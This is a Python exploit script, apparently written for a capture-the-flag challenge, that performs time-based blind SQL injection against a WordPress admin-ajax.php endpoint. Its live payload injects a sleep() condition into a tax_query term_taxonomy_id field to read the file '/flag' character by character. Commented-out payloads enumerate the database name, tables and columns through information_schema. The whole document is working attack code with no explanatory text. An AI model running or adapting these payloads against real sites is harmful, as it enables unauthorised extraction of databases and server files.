import requests
import time

def time_delay(url, headers, payload):
    start_time = time.time()
    response = requests.post(url, headers=headers, data=payload)
    end_time = time.time()
    #print(end_time,start_time)
    delay = end_time - start_time
    return delay

def time_based_blind_sql_injection(url, headers):
    result=[]
    for i in range(1, 100):
        for j in range(32,126):#r'0123456789abcdefghijklmnopqrstuvwxyz_-{}':
            #find db
            #payload = """{"id":" (if((substr(database(),%d,1))='%s',sleep(10),1))#"}""" % (i, j)
            #find table
            #payload = """{"id":" (if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))=%d,sleep(10),1))#"}""" % (i, j)
            #find table -wp%
            #payload = """{"id":" (if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() and table_name not like 0x777025),%d,1))=%d,sleep(10),1))#"}""" % (i, j)
            #find column
            #payload = """{"id":" (if(ascii(substr((select count(column_name) from information_schema.columns where table_name='flag'),%d,1))=%d,sleep(10),1))#"}""" % (i, j)
            #payload = """{"id":" ()#"}""" % (i, j)
            #payload = """action=test&data={"tax_query":{"0":{"field":"term_taxonomy_id","terms":["1) or (if(ascii(substr((select database()),%d,1))=%d,sleep(10),1))#"]}}}""" % (i, j)
            payload = """action=test&data={"tax_query":{"0":{"field":"term_taxonomy_id","terms":["1) or (if(ascii(substr((select load_file('/flag')),%d,1))=%d,sleep(4),1))#"]}}}""" % (i, j)
            delay = time_delay(url, headers, payload)
            print('{ ',''.join(result),' } -> @',i,'-',j,"time_delay:",delay)
            if delay > 4:
                result.append(chr(j))
                print(''.join(result))
                break
    else:
        print("The payload is not vulnerable to SQL injection.")
    print('result:',''.join(result))

if __name__ == "__main__":
    url = "http://eci-2zehfpkdvudcyvog8a91.cloudeci1.ichunqiu.com/wp-admin/admin-ajax.php"
    headers = {
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Cookie': '_ga=GA1.2.617032228.1689668529; _ga_J1DQF09WZC=GS1.2.1689668531.1.0.1689668531.0.0.0',
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded',
    }
    
    time_based_blind_sql_injection(url, headers)
